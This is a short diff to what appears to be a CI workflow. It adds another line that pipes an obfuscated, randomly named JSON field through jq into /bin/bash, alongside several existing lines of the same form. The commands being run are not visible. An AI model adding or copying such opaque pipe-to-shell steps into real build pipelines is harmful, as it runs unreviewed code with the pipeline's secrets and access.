@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$b61" | jq -r .wauh04524 | /bin/bash
           printf '%s' "$ft97409" | jq -r .ko7948 | /bin/bash
           echo $rezip64145 | jq -r .irarf107 | /bin/bash
+          echo $fls1037 | jq -r .ygd6 | /bin/bash
 
       - name: Upload results
         if: always()
